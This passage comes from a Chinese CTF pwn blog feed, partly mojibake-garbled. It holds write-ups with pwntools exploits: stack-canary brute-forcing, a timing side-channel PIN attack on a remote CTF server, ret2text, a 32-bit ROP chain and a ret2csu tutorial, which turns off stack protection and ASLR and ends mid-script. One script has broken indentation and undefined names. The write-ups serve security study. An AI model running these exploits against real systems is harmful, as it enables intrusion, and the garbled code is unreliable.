...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> re_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1) + p8(re_i)</span><br><span class="line"><span class="comment">#p8()å°†ç»™å®šçš„æ•´æ•°è½¬æ¢ä¸ºå•å­—èŠ‚çš„å­—èŠ‚ä¸²</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  recv = p.recvuntil(<span class="string">b&quot;welcome\n&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">       re_2 = re_i</span><br><span class="line">       success(<span class="string">f&quot;re_2 =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(re_2)&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1 - <span class="number">1</span>) + p8(re_2 - <span class="number">1</span>)<span class="comment">#-1å¯¹é½æ ˆ</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æœ¬åœ°get<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530213510778.png" alt="image-20230530213510778">  </p><p><strong>login</strong><br>æ— é™„ä»¶ åªæ‰“è¿œç¨‹ æ¶¨çŸ¥è¯†æ ä¾§ä¿¡é“æ”»å‡» </p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">    p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpin</span>(<span class="params">pin</span>):</span><br><span class="line">subtime = -<span class="number">1</span></span><br><span class="line">res =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line">pin_o = pin+c+<span class="string">&#x27;0&#x27;</span>*(<span class="number">7</span>-<span class="built_in">len</span>(pin))</span><br><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;PIN code: &quot;</span>)</span><br><span class="line">start=time.time()</span><br><span class="line">sl(pin_o)</span><br><span class="line">rev=ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Wrong PIN code&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(pin_0)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">end=time.time()</span><br><span class="line"><span class="built_in">sum</span>+=(end-start)</span><br><span class="line"><span class="built_in">print</span>(cur,<span class="built_in">sum</span>)</span><br><span class="line">avgtime=<span class="built_in">sum</span></span><br><span class="line"><span class="keyword">if</span>(avgtime&gt;subtime):</span><br><span class="line">subtime=avgtime</span><br><span class="line">res=c</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">a=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">p= remote(<span class="string">&quot;123.56.238.150&quot;</span>,<span class="number">45118</span>)</span><br><span class="line">pin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">pin+=getpin(pin)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;PIN:&quot;</span>,pin)</span><br><span class="line">ru(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;PASSWD&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#flag&#123;d39a1013-e066-4d64-8558-4a5855fb7303&#125;   pin code : 54730891</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ã€SSCTFã€‘"><a href="#ã€SSCTFã€‘" class="headerlink" title="ã€SSCTFã€‘"></a>ã€SSCTFã€‘</h3><p>pwn_stack<br>ï¼ˆ1ï¼‰checksec </p><p>â€‹      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604234931863.png" alt="image-20230604234931863"></p><p>â€‹       åªå¼€äº†NXå¥½åŠæğŸ˜€<br>ï¼ˆ2ï¼‰ è¿›IDA<br>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235352214.png" alt="image-20230604235352214"></p><p>å¾ˆæ˜æ˜¾çš„å‡½æ•°æç¤º å…ˆçœ‹çœ‹ä¸»å‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235530821.png" alt="image-20230604235530821"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235541815.png" alt="image-20230604235541815"></p><p>bufæº¢å‡ºä½†è¢«æ‰“å°å‡º å¯å¿½è§†ï¼ˆæ­¤å¤„çŸ¥è¯†ç‚¹è¾ƒä¸ºæ¨¡ç³Š è¿˜éœ€è¿›ä¸€æ­¥è¿›è¡Œç ”ç©¶è§£è¯»ï¼‰v1å¤„æº¢å‡º<br>æŸ¥çœ‹åç§»ä½0x98 å†å›åˆ°shellå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230605000024030.png" alt="image-20230605000024030"></p><p>æ²¡ä»€ä¹ˆå¥½è¯´ç›´æ¥å¼€æ•´ å…¸å‹ret2text<br>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./1&quot;</span>)<span class="comment">#å¤ªæ‡’äº†ç»™æ–‡ä»¶åæ”¹åäº†ğŸ˜œ</span></span><br><span class="line">bin_sh = <span class="number">0x0400831</span> </span><br><span class="line">sys_addr = <span class="number">0x40083D</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;What&#x27;s your name?&quot;)</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>* (<span class="number">0x90</span> + <span class="number">8</span>) + p64(bin_sh)  + p64(sys_addr)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;yub&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;How old are you?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ä»å‡½æ•°å¤´è¿”å›æ³¨æ„æ ˆå¯¹é½é—®é¢˜ +1è·³è¿‡push rbpçš„8å­—èŠ‚å¯¹é½</p><h3 id="ã€Black-Ropã€‘"><a href="#ã€Black-Ropã€‘" class="headerlink" title="ã€Black Ropã€‘"></a>ã€Black Ropã€‘</h3><p>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171541372.png" alt="image-20230629171541372"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171837565.png" alt="image-20230629171837565"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171906502.png" alt="image-20230629171906502"></p><p>å¸¸è§„æº¢å‡ºæ~<br>ç³»ç»Ÿæ²¡ç»™å‡ºsystemå’Œâ€&#x2F;bin&#x2F;shâ€ æ‰€ä»¥æ„é€ rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">pop4 = <span class="number">0x080493e8</span> <span class="comment"># pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop1 = <span class="number">0x0804901e</span> <span class="comment"># pop ebx ; ret</span></span><br><span class="line">pop2 = <span class="number">0x080493ea</span> <span class="comment"># pop edi ; pop ebp ; ret</span></span><br><span class="line">pop3 = <span class="number">0x080493e9</span> <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x12</span>+ flat(<span class="number">0</span>,<span class="number">0x80492ce</span>,<span class="number">0x8049293</span>, pop1, <span class="number">0x804a033</span>, <span class="number">0x80492e8</span>, pop1, <span class="number">0xbae</span>, <span class="number">0x804930b</span>, pop2, <span class="number">0x62023</span> , <span class="number">0xBF1212</span>, <span class="number">0x80491c2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;check your identity and read the flag.\n&quot;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2023/09/01/ret2csu/"/>
      <url>/2023/09/01/ret2csu/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åˆ©ç”¨x64ä¸‹__libc_csu_initå‡½æ•°ä¸­çš„gadgets.ï¼ˆ64ä½ä¼ å‚æœºåˆ¶å¯¼è‡´ï¼Œä½†æˆ‘ä»¬ä¸ä¼šæ¯æ¬¡éƒ½ç²¾å‡†æ‰¾åˆ°æ¯ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsï¼‰</p><p>æ­¤å‡½æ•°å¯¹libcè¿›è¡Œåˆå§‹åŒ–ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œåˆ™æ­¤å‡½æ•°ä¸€å®šå­˜åœ¨.</p><p><strong>ä»€ä¹ˆæ˜¯gadgetsï¼Ÿ</strong><br>gadgetsæ˜¯ä¸€æ®µå¯¹å¯„å­˜å™¨è¿›è¡Œæ“ä½œçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ¯”å¦‚pop ebpï¼›pop eaxï¼›æ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”ç€ä¸€æ®µåœ°å€å°†è¿™äº›gadgetséƒ¨ç½²åˆ°æ ˆä¸­ï¼Œ__ spæŒ‡é’ˆæŒ‡å‘æŸgadgetæ—¶å‘ç°å¯¹åº”åœ°å€ä¸­æ˜¯ä¸€æ¡æŒ‡ä»¤è€Œä¸æ˜¯ä¸€æ¡æ•°æ®åå°±ä¼šå°†è¯¥åœ°å€å¼¹ç»™ __ ipæŒ‡é’ˆï¼Œ __ipæŒ‡é’ˆä¼šæ‰§è¡Œè¯¥åœ°å€ä¸­å­˜æ”¾çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå®Œæˆå¯¹å¯„å­˜å™¨çš„æ“ä½œ.ï¼ˆæŸä¸€gadget-0x1aå¾—åˆ°ä¸Šä¸€gadgetï¼‰ </p><h3 id="å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰"><a href="#å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰" class="headerlink" title="å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰"></a>å®ä¾‹ï¼ˆè’¸ç±³ROPï¼‰</h3><p>æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é—­æ ˆä¿æŠ¤å¹¶è¿›è¡Œç¼–è¯‘</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">g</span> -fno-<span class="keyword">stack</span>-protector â€”z execstack -o <span class="keyword">test</span>.c <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p>å…³é—­æœ¬æœºéšæœºåŒ–ï¼ˆä½é…ï¼‰</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo <span class="number">0</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space</span><br></pre></td></tr></table></figure><p>checksecçœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png" alt="image-20230728162434881"></p><p>å¯ä»¥çœ‹åˆ°PIEè¿˜æ‰“å¼€ï¼ˆä½†æˆ‘ä»¬å…³é—­äº†æœ¬æœºä¸Šçš„åœ°å€éšæœºåŒ–å¯ä»¥å½“ä½œPIEdisableï¼‰<br>ç›¸å½“äºç”¨</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-<span class="keyword">stack</span>-protector -<span class="keyword">no</span>-pie -o level <span class="keyword">test</span>.c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729002006111.png" alt="image-20230729002006111"></p><p>Go to IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729152236817.png" alt="image-20230729152236817"></p><p>ä¸‹é¢ä¸ºgadget1ï¼Œä¸Šé¢ä¸ºgadget2.ï¼ˆä¸åŒç‰ˆæœ¬gagget2ä¸åŒï¼Œéœ€è¦ä¿®æ”¹ï¼‰</p><p>èµ·å§‹åœ°å€å¯ä»¥ç”¨0x4006AAï¼Œå› ä¸ºæˆ‘ä»¬å¹¶ä¸éœ€è¦addï¼Œä»popéœ€è¦å¯„å­˜å™¨å¼€å§‹å°±ğŸ†—.ä½†æ˜¯éœ€è¦å ä½ï¼ˆè§£é¢˜æ€è·¯ä¸­è¯¦ç»†è§£é‡Šï¼Œè¯·çœ‹ä»¥ä¸‹åˆ†æï¼‰</p><p><strong>é”™ä½è·å–pop rsiï¼›pop rdi</strong><br>è‹¥åªæ˜¯æƒ³å•çº¯æ§åˆ¶pop rsiå’Œpop rdiå¯„å­˜å™¨ï¼Œå¯ä»¥åˆ©ç”¨ROPgadgetï¼ˆpop r14å’Œpop r15å¯¹åº”å¾—gadgetå­˜åœ¨äºlibc_csu_initä¸­ï¼‰<br>æœºå™¨ç ä¸º<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729004219289.png" alt="image-20230729004219289"></p><p>å…·ä½“searchè¯­æ³•</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">level</span> <span class="built_in">--opcode</span> <span class="string">5e</span></span><br><span class="line"><span class="comment">#æˆ–è€…</span></span><br><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">level</span> | <span class="string">grep</span> <span class="string">&#x27;pop rsi&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œsystemï¼ˆâ€˜&#x2F;bin&#x2F;shâ€™ï¼‰ï¼ŒNXä¿æŠ¤å¼€å¯ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²libcå‡½æ•°åœ°å€(é€šè¿‡read&#x2F;writeå‡½æ•°)ï¼Œæ‰¾åˆ°systemå‡½æ•°å†™å…¥â€˜&#x2F;bin&#x2F;shâ€™åˆ°bssæ®µä¸Šï¼Œæœ€åè°ƒç”¨systemå‡½æ•°.</p><p><strong>æ³¨æ„</strong><br>æˆ‘ä»¬é€šå¸¸ä¼šæŠŠrbxçš„å€¼è®¾ç½®æˆ0ï¼Œè€Œrbpè®¾ç½®æˆ1.è¿™æ ·çš„ç›®çš„æ˜¯åœ¨æ‰§è¡Œcall qword ptr [r12+rbx*8]è¿™ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä»…ä»…æŠŠr12çš„å€¼ç»™è®¾ç½®æˆæŒ‡å‘æˆ‘ä»¬æƒ³callåœ°å€çš„åœ°å€å³å¯ï¼Œä»è€Œä¸ç”¨ç®¡rbxã€‚<br>åˆå› ä¸ºè¿™ä¸‰ä¸ªæŒ‡ä»¤add rbx,ï¼›cmp rbx, rbpï¼›jnz short loc_400580ï¼Œjnzæ˜¯ä¸ç›¸ç­‰æ—¶è·³è½¬ï¼Œæˆ‘ä»¬é€šå¸¸å¹¶ä¸æƒ³è·³è½¬åˆ°0x400580è¿™ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ­¤åˆ»æ‰§è¡Œè¿™ä¸‰ä¸ªæŒ‡ä»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±æ˜¯ä»0x400580è¿™ä¸ªåœ°å€è¿‡æ¥çš„ã€‚å› æ­¤rbxåŠ ä¸€ä¹‹åï¼Œæˆ‘ä»¬è¦è®©å®ƒå’Œrbpç›¸ç­‰ï¼Œå› æ­¤rbpå°±è¦æå‰è¢«è®¾ç½®æˆ1.<br>r12è¦å­˜æ”¾çš„å°±æ˜¯æŒ‡å‘ï¼ˆæˆ‘ä»¬è¦è·³è½¬åˆ°é‚£ä¸ªåœ°å€ï¼‰çš„åœ°å€ã€‚è¿™é‡Œæœ‰ä¸ªå¾ˆé‡è¦çš„å°æŠ€å·§ï¼Œå¦‚æœä½ ä¸æƒ³ä½¿ç”¨è¿™ä¸ªcallï¼Œæˆ–è€…è¯´ä½ æƒ³callä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä½ æ‹¿ä¸åˆ°å®ƒçš„gotåœ°å€ï¼Œå› æ­¤æ²¡æ³•ä½¿ç”¨è¿™ä¸ªcallï¼Œé‚£å°±å»callä¸€ä¸ªç©ºå‡½æ•°ï¼ˆ_term_procå‡½æ•°ï¼‰ï¼ˆå¹¶ä¸”è¦æ³¨æ„çš„æ˜¯ï¼Œr12çš„åœ°å€å¡«å†™çš„å¹¶ä¸æ˜¯_term_procçš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼‰ã€‚<br>r13,r14,r15è¿™ä¸‰ä¸ªå€¼åˆ†åˆ«å¯¹åº”äº†rdx,rsi,ediã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œr15æœ€åä¼ ç»™çš„æ˜¯edi,æœ€årdiçš„é«˜å››å­—èŠ‚éƒ½æ˜¯00ï¼Œè€Œä½å››å­—èŠ‚æ‰æ˜¯r15é‡Œçš„å†…å®¹ã€‚ï¼ˆä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³ç”¨ret2csuå»æŠŠrdié‡Œå­˜æ”¾æˆä¸€ä¸ªåœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼‰</p><p><strong>å¡«å……å›¾</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011314600.png" alt="image-20230729011314600"></p><p>æ³¨æ„gadgetæœ«å°¾æœ‰ä¸ªret p64ï¼ˆ8ï¼‰å ä½</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011813031.png" alt="image-20230729011813031"></p><p>ä¸ºä»€ä¹ˆè¦å°†systemå‡½æ•°åœ°å€å†™å…¥bssæ®µ? å› ä¸ºè¿™è¡Œä»£ç call qword ptr [r12+rbx*8]æ˜¯<u>é—´æ¥è·³è½¬</u>ï¼Œä¹Ÿå°±æ˜¯å…ˆå°†r12åœ°å€çš„å€¼å–å‡ºæ¥ï¼Œå†è¿›è¡Œè·³è½¬(æƒ³æƒ³Lazy Binding)ã€‚æœ€åçš„æ•ˆæœå°±æ˜¯ï¼Œä»bss_addrä¸­å–å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†è·³è½¬åˆ°systemå‡½æ•°å¤„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729012308773.png" alt="image-20230729012308773"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSeacher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400564</span></span><br><span class="line">bss_addr = <span class="number">0x601028</span></span><br><span class="line">gadget1 = <span class="number">0x400606</span></span><br><span class="line">gadget2 = <span class="number">0x4005F0</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got)</span><br><span class="line">payload1 += p64(<span class="number">8</span>) + p64(gadget2) + cyclic(<span class="number">0x38</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">sys_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0</span>) + p64(bss_addr)</span><br><span class="line">payload2 += p64(<span class="number">16</span>) + p64(gadget2) + cyclic(<span class="number">0x38</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload2)</span><br><span class="line">sleep(<span 